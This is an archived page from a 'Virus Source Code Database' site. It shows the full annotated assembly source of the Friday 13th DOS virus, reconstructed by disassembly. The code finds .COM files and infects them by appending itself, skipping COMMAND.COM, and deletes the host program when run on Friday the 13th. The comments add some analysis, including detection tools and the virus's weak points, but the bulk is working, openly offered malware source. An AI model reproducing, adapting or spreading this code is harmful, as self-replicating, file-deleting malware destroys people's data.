<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: friday13_asm</title>
<meta name="KEYWORDS" content="friday13.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for friday13.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="faces_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faces_asm.php">faces_asm</a><br>
<a href="fade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fade_asm.php">fade_asm</a><br>
<a href="faerie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faerie_asm.php">faerie_asm</a><br>
<a href="fat_fuck_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fat_fuck_asm.php">fat_fuck_asm</a><br>
<a href="fatman__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman__asm.php">fatman__asm</a><br>
<a href="fatman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman_asm.php">fatman_asm</a><br>
<a href="femifbia_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/femifbia_pas.php">femifbia_pas</a><br>
<a href="ffire_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/ffire_asm.php">ffire_asm</a><br>
<a href="firecide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecide_asm.php">firecide_asm</a><br>
<a href="firecris_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecris_asm.php">firecris_asm</a><br>
<a href="firecrpt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecrpt_asm.php">firecrpt_asm</a><br>
<a href="firefly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firefly_asm.php">firefly_asm</a><br>
<a href="fish___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish___asm.php">fish___asm</a><br>
<a href="fish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish__asm.php">fish__asm</a><br>
<a href="fish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish_asm.php">fish_asm</a><br>
<a href="flagyll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyll_asm.php">flagyll_asm</a><br>
<a href="flagyllz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyllz_asm.php">flagyllz_asm</a><br>
<a href="flip2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip2_asm.php">flip2_asm</a><br>
<a href="flip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip_asm.php">flip_asm</a><br>
<a href="flu_not_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_asm.php">flu_not_asm</a><br>
<a href="flu_not_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_c.php">flu_not_c</a><br>
<a href="fmt12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fmt12_asm.php">fmt12_asm</a><br>
<a href="fonetone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fonetone_asm.php">fonetone_asm</a><br>
<a href="foo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/foo_asm.php">foo_asm</a><br>
<a href="form2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/form2_asm.php">form2_asm</a><br>
<a href="formvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/formvir_asm.php">formvir_asm</a><br>
<a href="fri_13th_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fri_13th_asm.php">fri_13th_asm</a><br>
<a href="friday13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday13_asm.php">friday13_asm</a><br>
<a href="friday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday_asm.php">friday_asm</a><br>
<a href="frog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frog_asm.php">frog_asm</a><br>
<a href="froggie_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/froggie_pas.php">froggie_pas</a><br>
<a href="frtfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frtfly_asm.php">frtfly_asm</a><br>
<a href="fruitfl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfl2_asm.php">fruitfl2_asm</a><br>
<a href="fruitfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfly_asm.php">fruitfly_asm</a><br>
<a href="fruitful_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitful_asm.php">fruitful_asm</a><br>
<a href="fumanchu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fumanchu_asm.php">fumanchu_asm</a><br>
<a href="fun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fun_asm.php">fun_asm</a><br>
<a href="funked_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funked_asm.php">funked_asm</a><br>
<a href="funkybom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funkybom_asm.php">funkybom_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл                             FRIDAY13                                 лл
;лл                                                                      лл
;лл      Created:   31-Jul-90                                            лл
;лл      Version:                                                        лл
;лл      Passes:    9          Analysis Options on: QRS                  лл
;лл                                                                      лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

;       This assembly code was created from the Sourcer disassembly of
;       the original virus.

;       The Assembler option was set to "Other" and may require some
;       patching in order to assemble properly with any given
;       compiler.


;       Primitive virus, infects every .COM file not exceeding 64k
;       that if finds, with the exception of COMMAND.COM.....the
;       extended disk activity is easily spotted and should warn
;       any reasonably alert user that something is amiss.

;       Infected files can be detected with John McAfee's virus
;       scanners and Fridrik Skulason's F-PROT package, to name my
;       favorite tools.

;       The F-PROT package will remove the virus from infected files
;       without damaging the host programs, in my experience, while
;       CleanUp destroys both the virus and the host program.

movSeg           macro reg16, unused, Imm16     ; Fixup for Assembler
                 ifidn  <reg16>, <bx>
                 db     0BBh
                 endif
                 ifidn  <reg16>, <cx>
                 db     0B9h
                 endif
                 ifidn  <reg16>, <dx>
                 db     0BAh
                 endif
                 ifidn  <reg16>, <si>
                 db     0BEh
                 endif
                 ifidn  <reg16>, <di>
                 db     0BFh
                 endif
                 ifidn  <reg16>, <bp>
                 db     0BDh
                 endif
                 ifidn  <reg16>, <sp>
                 db     0BCh
                 endif
                 ifidn  <reg16>, <BX>
                 db     0BBH
                 endif
                 ifidn  <reg16>, <CX>
                 db     0B9H
                 endif
                 ifidn  <reg16>, <DX>
                 db     0BAH
                 endif
                 ifidn  <reg16>, <SI>
                 db     0BEH
                 endif
                 ifidn  <reg16>, <DI>
                 db     0BFH
                 endif
                 ifidn  <reg16>, <BP>
                 db     0BDH
                 endif
                 ifidn  <reg16>, <SP>
                 db     0BCH
                 endif
                 dw     seg Imm16
endm

;       Start of the actual Friday 13th code

data_1e         equ     2Ch                     ; (77B9:002C=0)

data_2e         equ     80h                     ; (77B9:0080=0)
                                                ; DTA

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

friday13        proc    far

start:
                jmp     loc_1                   ; (014F)
                                                ; begin preparations

data_5          dw      0                       ;  xref 77B9:01D8, 01E5, 01EF, 0250
                                                ;            0289
                                                ; first 3 bytes of host

data_7          dw      4900h                   ;  xref 77B9:01DC, 024C, 0290
                db       4Eh, 46h, 45h, 43h, 54h, 45h
                db       44h, 00h               ; INFECTED
                                                ; An escaped lab version???

data_8          db      0E9h                    ;  xref 77B9:01EC, 0229
                                                ; replacement first 3 bytes
                                                ; of host prog.

data_9          dw      0                       ;  xref 77B9:0216, 0235
                                                ; start of virus code

data_10         db      2Ah                     ;  xref 77B9:0193
                db       2Eh, 43h, 4Fh, 4Dh
                db      0                       ; *.COM

data_12         db      0                       ;  xref 77B9:018A
                db      25 dup (0)              ;

data_13         dw      0                       ;  xref 77B9:01F5
                db      0, 0                    ; size of host file

data_14         db      0                       ;  xref 77B9:01B7, 01CC
                db      12 dup (0)              ; host file name

data_15         db      'COMMAND.COM', 0        ;  xref 77B9:01BA

;       Saves necessary host program data to enable return of control
;       to the host program when the virus has done its work.

loc_1:                                          ;  xref 77B9:0100
                push    cs                      ; save host seg.
                push    ax                      ; and offset space
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                mov     bp,sp                   ; host offset in stack
                mov     word ptr [bp+10h],100h
                call    sub_1                   ; (0163)

friday13                endp

;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;                              SUBROUTINE
;
;         Called from:   77B9:0160
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

;       Take control from host program.

sub_1           proc    near
                pop     ax
                sub     ax,63h
                mov     cl,4                    ; assume control
                shr     ax,cl                   ; Shift w/zeros fill
                mov     bx,cs
                add     ax,bx
                sub     ax,10h
                push    ax                      ; CS modified
                mov     ax,178h
                push    ax
                retf
sub_1           endp

                mov     ax,cs
                mov     ds,ax
                call    sub_2                   ; (0185)
                                                ; replication routine
                call    sub_4                   ; (025B)
                                                ; self-destruction routine
                jmp     loc_11                  ; (0289)
                                                ; return control to host

;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;                              SUBROUTINE
;
;         Called from:   77B9:017C
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

;       Self-replication routine

sub_2           proc    near                    ; self-replication begins
                push    es
                push    ds
                pop     es
                mov     ah,1Ah                  ; DTA
                mov     dx,offset data_12       ; (77B9:0118=0)
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                mov     ah,4Eh                  ; 'N'
                xor     cx,cx                   ; Zero register
                mov     dx,offset data_10       ; (77B9:0112=2Ah)
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                jc      loc_3                   ; Jump if carry Set

loc_2:                                          ;  xref 77B9:01A1
                call    sub_3                   ; (01B2)
                mov     ah,4Fh                  ; 'O'
                int     21h                     ; DOS Services  ah=function 4Fh
                                                ;  find next filename match

                jnc     loc_2                   ; Jump if carry=0
                                                ; find all potential host
                                                ; files, quit when no more
                                                ; to infect
                                                ; This is the basic weakness
                                                ; of the virus.

loc_3:                                          ;  xref 77B9:0198
                pop     ax
                push    ax
                push    ds
                mov     ds,ax
                mov     ah,1Ah                  ; restore DTA
                mov     dx,data_2e              ; (77B9:0080=0)
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                pop     ds
                pop     es
                retn
sub_2           endp


;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;                              SUBROUTINE
;
;         Called from:   77B9:019A
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

;       Suitable host file found, so infect it.

sub_3           proc    near
                push    es
                mov     ax,ds
                mov     es,ax
                mov     si,offset data_14       ; (77B9:0136=0)
                                                ; Host file name

                mov     di,offset data_15       ; (77B9:0143=43h)
                                                ; COMMAND.COM
                mov     cx,0Ch
                cld                             ; Clear direction
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                                                ; Is the file COMMAND.COM??
                pop     es
                jnz     loc_4                   ; Jump if not zero
                                                ; Not COMMAND.COM, so infect it

                jmp     loc_ret_9               ; (025A)
                                                ; Yes, so leave.

;       Open file to read/write

loc_4:                                          ;  xref 77B9:01C4
                mov     ax,3D02h
                mov     dx,offset data_14       ; (77B9:0136=0)
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jnc     loc_5                   ; Jump if carry=0
                jmp     loc_8                   ; (0258)

;       Save first 3 bytes of host program

loc_5:                                          ;  xref 77B9:01D1
                mov     bx,ax
                push    data_5                  ; (77B9:0103=0)
                push    data_7                  ; (77B9:0105=4900h)
                mov     ah,3Fh                  ; '?'
                mov     cx,3
                mov     dx,offset data_5        ; (77B9:0103=0)
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      loc_7                   ; Jump if carry Set
                mov     al,data_8               ; (77B9:010F=0E9h)
                                                ; Check host for infection
                cmp     byte ptr data_5,al      ; (77B9:0103=0)
                jne     loc_6                   ; Jump if not equal
                mov     ax,data_13              ; (77B9:0132=0)
                sub     ax,1A0h
                sub     ax,3
                cmp     word ptr data_5+1,ax    ; (77B9:0104=0)
                je      loc_7                   ; Jump if equal

loc_6:                                          ;  xref 77B9:01F3
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_7                   ; Jump if carry Set
                or      ax,0Fh
                inc     ax
                sub     ax,3
                mov     data_9,ax               ; (77B9:0110=0)
                                                ; virus code begins here
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_7                   ; Jump if carry Set
                mov     ah,40h                  ; '@'
                mov     cx,3
                mov     dx,offset data_8        ; (77B9:010F=0E9h)
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      loc_7                   ; Jump if carry Set
                mov     ax,4201h                ; point to end
                xor     cx,cx                   ; Zero register
                mov     dx,data_9               ; (77B9:0110=0)
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_7                   ; Jump if carry Set
                mov     ah,40h                  ; '@'
                                                ; append viral code to end
                                                ; of host file
                mov     cx,1A0h                 ; number of bytes to write
                mov     dx,offset ds:[100h]     ; (77B9:0100=0E9h)
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      loc_7                   ; Jump if carry Set
                jmp     loc_7                   ; (024C)

;       Restore first three bytes of host program and close the file

loc_7:                                          ;  xref 77B9:01EA, 0202, 020D, 0222
                                                ;            022E, 023B, 0247, 0249
                pop     data_7                  ; (77B9:0105=4900h)
                pop     data_5                  ; (77B9:0103=0)
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle

;       Finished?

loc_8:                                          ;  xref 77B9:01D3
                jnc     loc_ret_9               ; Jump if carry=0

;       Yes, then return.

loc_ret_9:                                      ;  xref 77B9:01C6, 0258
                retn
sub_3           endp


;пппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппппп
;                              SUBROUTINE
;
;         Called from:   77B9:017F
;мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

;       Here is where it gets nasty.  This subroutine checks the date when
;       the host program is called and, if it's a Friday the 13th, the
;       file is deleted.

sub_4           proc    near
                push    es
                mov     ah,2Ah                  ; '*'
                int     21h                     ; DOS Services  ah=function 2Ah
                                                ;  get date, cx=year, dx=mon/day
                cmp     dl,0Dh                  ; is today the day?
                jne     loc_10                  ; Jump if not equal
                cmp     al,5
                jne     loc_10                  ; Jump if not equal
                xor     ax,ax                   ; Zero register
                mov     cx,7FFFh
                xor     di,di                   ; Zero register
                mov     es,es:data_1e           ; (77B9:002C=0)
                                                ; environment block seg. address
                cld                             ; Clear direction
                repne   scasw                   ; Rep zf=0+cx >0 Scan es:[di] for ax
                jnz     loc_10                  ; Jump if not zero
                add     di,2
                push    ds                      ; start self-destruct
                push    es
                pop     ds
                mov     ah,41h                  ; 'A'
                mov     dx,di
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx
                pop     ds
loc_10:                                         ;  xref 77B9:0263, 0267, 0278
                pop     es
                retn
sub_4           endp


;       Return control to host program.

loc_11:                                         ;  xref 77B9:0182
                mov     ax,data_5               ; (77B9:0103=0)
                mov     word ptr es:[100h],ax   ; (77B9:0100=4CE9h)
                mov     al,byte ptr data_7      ; (77B9:0105=0)
                mov     byte ptr es:[102h],al   ; (77B9:0102=0)
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                retf                            ; Return far

seg_a           ends



                end     start

ББББББББББББББББББББ CROSS REFERENCE - KEY ENTRY POINTS БББББББББББББББББББ

    seg:off    type        label
   ---- ----   ----   ---------------
   77B9:0100   far    start

 ББББББББББББББББББ Interrupt Usage Synopsis ББББББББББББББББББ

        Interrupt 21h :  set DTA to ds:dx
        Interrupt 21h :  get date, cx=year, dx=mon/day
        Interrupt 21h :  open file, al=mode,name@ds:dx
        Interrupt 21h :  close file, bx=file handle
        Interrupt 21h :  read file, cx=bytes, to ds:dx
        Interrupt 21h :  write file cx=bytes, to ds:dx
        Interrupt 21h :  delete file, name @ ds:dx
        Interrupt 21h :  move file ptr, cx,dx=offset
        Interrupt 21h :  find 1st filenam match @ds:dx
        Interrupt 21h :  find next filename match

 ББББББББББББББББББ I/O Port Usage Synopsis  ББББББББББББББББББ

        No I/O ports used.


</textarea></td></tr></table></body></html>
